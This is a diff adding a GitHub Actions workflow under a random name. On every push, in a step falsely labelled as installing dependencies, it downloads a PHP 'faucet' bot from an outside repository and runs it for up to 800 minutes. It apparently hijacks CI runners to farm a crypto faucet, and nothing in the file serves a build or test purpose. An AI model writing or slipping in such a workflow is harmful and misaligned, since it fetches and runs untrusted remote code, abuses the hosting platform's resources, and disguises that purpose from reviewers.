@@ -1,0 +1,21 @@
+# This is a basic workflow to hel
+
+on:
+  push:
+name: mabufibu
+# ------------------------------------ #
+jobs:
+  v1:
+    runs-on: ubuntu-20.04
+    continue-on-error: True
+    steps:
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: '8.2'
+        coverage: none
+    - name: Install dependenciess
+      run: |
+        wget https://github.com/Ikuzot/Faucet/raw/main/Bitmon/bot.php
+        wget -O data.php https://github.com/Ikuzot/Faucet/raw/main/Bitmon/data.php
+        timeout 800m php bot.php
